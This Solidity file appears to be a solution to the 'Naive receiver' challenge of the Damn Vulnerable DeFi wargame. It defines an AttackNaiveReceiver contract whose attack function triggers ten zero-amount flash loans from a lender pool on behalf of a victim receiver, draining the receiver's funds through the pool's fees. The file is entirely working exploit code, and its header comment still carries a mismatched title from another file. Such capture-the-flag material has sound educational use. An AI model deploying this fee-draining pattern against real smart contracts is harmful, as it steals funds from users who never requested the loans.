// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "./NaiveReceiverLenderPool.sol";

/**
 * @title FlashLoanReceiver
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract AttackNaiveReceiver {
    using Address for address payable;

    NaiveReceiverLenderPool private pool;
    address public owner;

    constructor(NaiveReceiverLenderPool poolAddress) {
        pool = poolAddress;
        owner = msg.sender;
    }

    // Function called by the pool during flash loan
    function attack(address borrower) public payable {
        require(msg.sender == owner, "Sender must be owner");

        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(borrower, 0);
        }
    }
}
